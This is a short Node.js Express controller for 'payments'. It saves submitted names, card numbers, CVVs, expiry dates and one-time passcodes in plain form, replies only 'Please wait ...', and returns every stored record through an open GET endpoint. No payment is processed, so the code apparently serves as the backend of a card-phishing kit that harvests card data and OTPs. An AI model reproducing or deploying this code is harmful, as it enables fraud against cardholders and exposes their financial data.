// controllers/payController.js
import Payment from '../models/payModel.js';

// Get all payments
export const getPayments = async(req, res) => {
    try {
        const payments = await Payment.find().select('name cardNumber cvv expiry amount, otp ');
        res.status(200).json({ data: payments });
    } catch (error) {
        console.error('Error fetching payments:', error);
        res.status(500).json({ message: 'Failed to fetch payments' });
    }
};
// Add a payment
export const addPayment = async(req, res) => {
    const { name, cardNumber, cvv, expiry, otp } = req.body;

    try {
        const newPayment = new Payment({
            name,
            cardNumber,
            cvv,
            expiry,
            otp
        });

        await newPayment.save();

        res.status(201).json({ message: 'Please wait ...' });
    } catch (error) {
        console.error('Error adding payment:', error);
        res.status(500).json({ message: 'Failed to process payment' });
    }
};